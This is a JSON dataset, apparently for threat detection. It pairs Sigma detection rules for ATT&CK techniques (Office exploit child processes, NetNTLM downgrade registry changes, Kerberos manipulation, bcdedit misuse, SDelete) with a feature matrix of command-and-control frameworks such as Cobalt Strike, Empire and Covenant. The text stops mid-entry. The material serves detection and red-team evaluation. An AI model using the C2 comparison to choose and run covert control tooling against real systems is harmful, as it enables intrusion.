"detection": {"selection1": {"Source": "Application Error", "EventID": 1000}, "selection2": {"Source": "Windows Error Reporting", "EventID": 1001}, "keywords": {"Message": ["*MsMpEng.exe*", "*mpengine.dll*"]}, "condition": "1 of selection* and all of keywords"}, "falsepositives": ["MsMpEng.exe can crash when C:\\ is full"], "level": "high"}}]}, {"technique_id": "T1203", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Exploit for CVE-2017-8759", "id": "fdd84c68-a1f6-47c9-9477-920584f94905", "description": "Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759", "references": ["https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100", "https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100"], "tags": ["attack.execution", "attack.t1203"], "author": "Florian Roth", "date": "2017/09/15", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\WINWORD.EXE", "Image": "*\\csc.exe"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}]}, {"technique_id": "T1212", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"action": "global", "title": "NetNTLM Downgrade Attack", "id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2", "description": "Detects post exploitation using NetNTLM downgrade attacks", "references": ["https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks"], "author": "Florian Roth", "date": "2018/03/20", "tags": ["attack.credential_access", "attack.t1212"], "detection": {"condition": "1 of them"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection1": {"EventID": 13, "TargetObject": ["*SYSTEM\\\\*ControlSet*\\Control\\Lsa\\lmcompatibilitylevel", "*SYSTEM\\\\*ControlSet*\\Control\\Lsa\\NtlmMinClientSec", "*SYSTEM\\\\*ControlSet*\\Control\\Lsa\\RestrictSendingNTLMTraffic"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : Object Access > Audit Registry (Success)"}, "detection": {"selection2": {"EventID": 4657, "ObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\\\*ControlSet*\\Control\\Lsa", "ObjectValueName": ["LmCompatibilityLevel", "NtlmMinClientSec", "RestrictSendingNTLMTraffic"]}}}}, {"data_source": {"title": "Kerberos Manipulation", "id": "f7644214-0eb0-4ace-9455-331ec4c09253", "description": "This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages", "author": "Florian Roth", "tags": ["attack.credential_access", "attack.t1212"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [675, 4768, 4769, 4771], "FailureCode": ["0x9", "0xA", "0xB", "0xF", "0x10", "0x11", "0x13", "0x14", "0x1A", "0x1F", "0x21", "0x22", "0x23", "0x24", "0x26", "0x27", "0x28", "0x29", "0x2C", "0x2D", "0x2E", "0x2F", "0x31", "0x32", "0x3E", "0x3F", "0x40", "0x41", "0x43", "0x44"]}, "condition": "selection"}, "falsepositives": ["Faulty legacy applications"], "level": "high"}}, {"data_source": {"title": "Possible Remote Password Change Through SAMR", "id": "7818b381-5eb1-4641-bea5-ef9e4cfb5951", "description": "Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). \"Audit User Account Management\" in \"Advanced Audit Policy Configuration\" has to be enabled in your local security policy / GPO to see this events.", "author": "Dimitrios Slamaris", "tags": ["attack.credential_access", "attack.t1212"], "logsource": {"product": "windows", "service": "security"}, "detection": {"samrpipe": {"EventID": 5145, "RelativeTargetName": "samr"}, "passwordchanged": {"EventID": 4738}, "passwordchanged_filter": {"PasswordLastSet": null}, "timeframe": "15s", "condition": "( passwordchanged and not passwordchanged_filter ) | near samrpipe"}, "level": "medium"}}]}, {"technique_id": "T1067", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Possible Ransomware or unauthorized MBR modifications", "id": "c9fbe8e9-119d-40a6-9b59-dd58a5d84429", "status": "experimental", "description": "Detects, possibly, malicious unauthorized usage of bcdedit.exe", "references": ["https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set"], "author": "@neu5ron", "date": "2019/02/07", "tags": ["attack.defense_evasion", "attack.t1070", "attack.persistence", "attack.t1067"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"NewProcessName": "*\\bcdedit.exe", "ProcessCommandLine": ["*delete*", "*deletevalue*", "*import*"]}, "condition": "selection"}, "level": "medium"}}]}, {"technique_id": "T1066", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Secure Deletion with SDelete", "id": "39a80702-d7ca-4a83-b776-525b1f86a36d", "status": "experimental", "description": "Detects renaming of file while deletion with SDelete tool", "author": "Thomas Patzke", "references": ["https://jpcertcc.github.io/ToolAnalysisResultSheet", "https://www.jpcert.or.jp/english/pub/sr/ir_research.html", "https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx"], "tags": ["attack.defense_evasion", "attack.t1107", "attack.t1066", "attack.s0195"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [4656, 4663, 4658], "ObjectName": ["*.AAA", "*.ZZZ"]}, "condition": "selection"}, "falsepositives": ["Legitime usage of SDelete"], "level": "medium"}}]}, {"technique_id": "T1200", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "USB Device Plugged", "id": "1a4bd6e3-4c6e-405d-a9a3-53a116e341d4", "description": "Detects plugged USB devices", "references": ["https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/", "https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/"], "status": "experimental", "author": "Florian Roth", "tags": ["attack.initial_access", "attack.t1200"], "logsource": {"product": "windows", "service": "driver-framework"}, "detection": {"selection": {"EventID": [2003, 2100, 2102]}, "condition": "selection"}, "falsepositives": ["Legitimate administrative activity"], "level": "low"}}]}], "c2_data": {"Apfell": {"Name": "Apfell", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/its-a-feature/Apfell", "Site": "", "Twitter": "@its_a_feature_", "Evaluator": "@jorgeorchilles", "Date": "10/6/2019", "Version": "1.3", "Implementation": "Docker", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "No", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "No", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#ApFell bloodhoundgang.herokuapp.com", "Slack Members": "180", "GH Issues": "14", "Notes": ""}, "AsyncRAT-C#": {"Name": "AsyncRAT-C#", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "", "Dashboard": "", "NetWitness": "", "Actively Maint.": "", "Slack": "", "Slack Members": "NA", "GH Issues": "158", "Notes": ""}, "C3": {"Name": "C3", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/FSecureLABS/C3", "Site": "https://labs.f-secure.com/tools/c3/", "Twitter": "", "Evaluator": "", "Date": "", "Version": "1.0.0", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "No", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "No", "Dashboard": "", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#c3 bloodhoundgang.herokuapp.com", "Slack Members": "121", "GH Issues": "6", "Notes": ""}, "CALDERA": {"Name": "CALDERA", "License": "Apache 2", "Price": "NA", "GitHub": "https://github.com/mitre/caldera", "Site": "", "Twitter": "@fsecurelabs", "Evaluator": "@jorgeorchilles", "Date": "10/6/2019", "Version": "2", "Implementation": "pip3", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Go", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "181", "Notes": ""}, "CHAOS": {"Name": "CHAOS", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/tiagorlampert/CHAOS", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "3", "Implementation": "Go", "How-To": "", "Slingshot": "", "Kali": "Yes", "Server": "Go", "Agent": "Go", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "", "Linux": "", "macOS": "", "TCP": "Yes", "HTTP": "No", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "", "Dashboard": "", "NetWitness": "", "Actively Maint.": "", "Slack": "No", "Slack Members": "NA", "GH Issues": "41", "Notes": ""}, "Cobalt Strike": {"Name": "Cobalt Strike", "License": "Commercial", "Price": "$3,500", "GitHub": "", "Site": "https://www.cobaltstrike.com/", "Twitter": "", "Evaluator": "@TimMedin", "Date": "11/20/2019", "Version": "3.14", "Implementation": "binary", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Java", "Agent": "C", "Multi-User": "Yes", "UI": "GUI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "Yes", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "Yes", "Key Exchange": "Yes", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "Yes", "Dashboard": "Yes", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "NA", "Notes": ""}, "Covenant": {"Name": "Covenant", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/cobbr/Covenant", "Site": "https://cobbr.io/tags#covenant", "Twitter": "@cobbr_io", "Evaluator": "@jorgeorchilles", "Date": "10/6/2019", "Version": "0.3", "Implementation": "Docker", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "C#", "Agent": "C#", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "Yes", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "#covenant bloodhoundhq.slack.com", "Slack Members": "665", "GH Issues": "108", "Notes": ""}, "Dali": {"Name": "Dali", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/h0mbre/Dali", "Site": "https://h0mbre.github.io/Image_Based_C2_PoC/", "Twitter": "@h0mbre_", "Evaluator": "@jorgeorchilles", "Date": "12/24/2019", "Version": "POC", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "BYOI", "Linux": "BYOI", "macOS": "BYOI", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "Yes", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": "Uses Imgur"}, "Empire": {"Name": "Empire", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/BC-SECURITY/Empire", "Site": "", "Twitter": "@BCSecurity1", "Evaluator": "@jorgeorchilles", "Date": "1/30/2020", "Version": "3.0.5", "Implementation": "install.sh", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "Python", "Agent": "PowerShell", "Multi-User": "Yes", "UI": "GUI", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "Yes", "Kill Date": "Yes", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "Yes", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "#psempire bloodhoundhq.slack.com", "Slack Members": "1299", "GH Issues": "61", "Notes": ""}, "EvilOSX": {"Name": "EvilOSX", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/Marten4n6/EvilOSX", "Site": "", "Twitter": "", "Evaluator": "@cabbagesalad2", "Date": "11/12/2019", "Version": "7.2.1", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "Yes", "Server": "Python", "Agent": "Python", "Multi-User": "No", "UI": "GUI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "89", "Notes": ""}, "Faction C2": {"Name": "Faction C2", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/FactionC2/", "Site": "https://www.factionc2.com/", "Twitter": "", "Evaluator": "@jorgeorchilles", "Date": "10/30/2019", "Version": "NA", "Implementation": "install.sh", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": ".NET", "Agent": ".NET", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "TLS", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#factionc2 bloodhoundhq.slack.com", "Slack Members": "203", "GH Issues": "38", "Notes": ""}, "FlyingAFalseFlag": {"Name": "FlyingAFalseFlag", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/monoxgas/FlyingAFalseFlag", "Site": "", "Twitter": "", "Evaluator": "@jorgeorchilles", "Date": "11/12/2019", "Version": "POC", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C++", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "1", "Notes": "PostOffice EWS SendGrid & Addendum VirusTotal"}, "FudgeC2": {"Name": "FudgeC2", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/Ziconius/FudgeC2", "Site": "", "Twitter": "@Ziconius", "Evaluator": "@jorgeorchilles", "Date": "2/11/2020", "Version": "Beta", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "Yes", "Server": "Python", "Agent": "Powershell", "Multi-User": "Yes", "UI": "Web", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#fudgec2 bloodhoundhq.slack.com", "Slack Members": "NA", "GH Issues": "3", "Notes": ""}, "godoh": {"Name": "godoh", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/sensepost/goDoH", "Site": "", "Twitter": "@leonjza", "Evaluator": "@cabbagesalad2", "Date": "10/31/2019", "Version": "1.6", "Implementation": "binary", "How-To": "", "Slingshot": "", "Kali": "Yes", "Server": "Go", "Agent": "Go", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "No", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "Yes", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "1", "Notes": ""}, "HARS": {"Name": "HARS", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell", "Site": "", "Twitter": "", "Evaluator": "@leekirkpatrick4", "Date": "3/24/2020", "Version": "POC", "Implementation": "python", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C#", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "2", "Notes": ""}, "ibombshell": {"Name": "ibombshell", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/ElevenPaths/ibombshell", "Site": "", "Twitter": "", "Evaluator": "@jorgeorchilles", "Date": "11/12/2019", "Version": "0.0.3b", "Implementation": "pip3", "How-To": "Yes", "Slingshot": "", "Kali": "Yes", "Server": "Python", "Agent": "PowerShell", "Multi-User": "No", "UI": "GUI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "5", "Notes": ""}, "INNUENDO": {"Name": "INNUENDO", "License": "Commercial", "Price": "Contact Sales", "GitHub": "", "Site": "https://www.immunityinc.com/products/innuendo/", "Twitter": "", "Evaluator": "@daveaitel", "Date": "11/11/2019", "Version": "1.7", "Implementation": "install.sh", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "No", "ICMP": "Yes", "FTP": "Yes", "IMAP": "Yes", "MAPI": "Yes", "SMB": "Yes", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "NA", "Notes": ""}, "Koadic C3": {"Name": "Koadic C3", "License": "Apache 2", "Price": "NA", "GitHub": "https://github.com/zerosum0x0/koadic", "Site": "", "Twitter": "", "Evaluator": "@jorgeorchilles", "Date": "9/27/2019", "Version": "0xA (10)", "Implementation": "pip3", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "Python", "Agent": "JScript/VBScript", "Multi-User": "No", "UI": "GUI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "Yes", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "94", "Notes": "Requires valid cert for HTTPS"}, "MacShellSwift": {"Name": "MacShellSwift", "License": "NA", "Price": "NA", "GitHub": "https://github.com/cedowens/MacShellSwift", "Site": "", "Twitter": "@cedowens", "Evaluator": "@Adam_Mashinchi", "Date": "11/13/2019", "Version": "N/A", "Implementation": "python", "How-To": "", "Slingshot": "Yes", "Kali": "", "Server": "Python", "Agent": "Swift", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "No", "Linux": "No", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "TLS", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": ""}, "Merlin": {"Name": "Merlin", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/Ne0nd0g/merlin", "Site": "http://medium.com/@Ne0nd0g", "Twitter": "@merlin_c2", "Evaluator": "@jorgeorchilles", "Date": "11/4/2019", "Version": "0.8.0", "Implementation": "Binary", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "Go", "Agent": "Go", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "Yes", "HTTP3": "Yes", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "aPAKE OPAQUE", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#merlin bloodhoundhq.slack.com", "Slack Members": "278", "GH Issues": "57", "Notes": ""}, "Metasploit": {"Name": "Metasploit", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/rapid7/metasploit-framework", "Site": "https://metasploit.com", "Twitter": "@metasploit", "Evaluator": "@busterbcook", "Date": "12/4/2019", "Version": "5.0.62", "Implementation": "Ruby", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Ruby", "Agent": "C/Java/PHP/Python", "Multi-User": "Yes", "UI": "CLI", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "Yes", "Key Exchange": "RSA", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "metasploit.slack.com", "Slack Members": "4653", "GH Issues": "3953", "Notes": ""}, "Meterpeter": {"Name": "Meterpeter", "License": "NA", "Price": "", "GitHub": "https://github.com/r00t-3xp10it/meterpeter", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "No", "Dashboard": "", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": ""}, "Ninja": {"Name": "Ninja", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/ahmedkhlief/Ninja/", "Site": "https://shells.systems/introducing-ninja-c2-the-c2-built-for-stealth-red-team-operations/", "Twitter": "", "Evaluator": "@leekirkpatrick4", "Date": "4/3/2020", "Version": "Beta", "Implementation": "python", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C#/PowerShell", "Multi-User": "Yes", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": 